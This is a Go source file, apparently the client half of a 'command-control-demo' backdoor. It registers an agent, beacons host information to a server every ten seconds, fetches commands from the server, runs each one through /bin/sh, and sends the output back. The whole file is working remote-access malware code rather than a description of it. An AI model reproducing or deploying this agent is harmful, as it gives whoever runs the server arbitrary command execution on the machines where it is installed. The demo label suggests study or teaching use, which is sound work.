package util

import (
	"SafeDp/backdoor/command-control-demo/client/models"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strings"
	"time"
)

var (
	Agent *models.Agent
)

func init() {
	debug := true
	agent, err := models.NewAgent(debug, "http")
	fmt.Println(agent, err)
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}
	Agent = agent
}

func Ping() {
	agentInfo := Agent.ParseInfo()
	data, _ := json.Marshal(agentInfo)
	url := fmt.Sprintf("%v/ping",Agent.URL)

	beat := time.Tick(10* time.Second)
	for range beat {
		req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
		resp, err := Agent.Client.Do(req)
		if err == nil {
			_ = resp.Body.Close()
	}
	}
}

func Command() {
	fmt.Println("agent: ", Agent)
	url := fmt.Sprintf("%v/cmd/%v", Agent.URL, Agent.AgentId)
	beat := time.Tick(10 * time.Second)
	for range beat {
		req, err := http.NewRequest("POST", url, nil)
		resp, err := Agent.Client.Do(req)
		if err == nil {
			r, err := io.ReadAll(resp.Body)
			cmds := make([]models.Command,0)
			err = json.Unmarshal(r, &cmds)
			for _, cmd := range cmds {
				ret, err := execCmd(cmd.Content)
				fmt.Print(cmd, ret, err)
				_ = submitCmd(cmd.Id, ret)
			}
			_ = resp.Body.Close()
		}
	}
}

func execCmd(command string) (string, error) {
	Cmd := exec.Command("/bin/sh", "-c", command)
	ret, err := Cmd.CombinedOutput()
	retstring := string(ret)
	return retstring, err
}

func submitCmd(id int64, result string) error {
	urlCmd := fmt.Sprintf("%v/send_result/%v", Agent.URL, id)
	data := url.Values{}
	data.Add("result", result)
	body := strings.NewReader(data.Encode())
	req, err := http.NewRequest("POST", urlCmd, body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := Agent.Client.Do(req)
	if err != nil {
		return err
	}
	err = resp.Body.Close()
	return err
}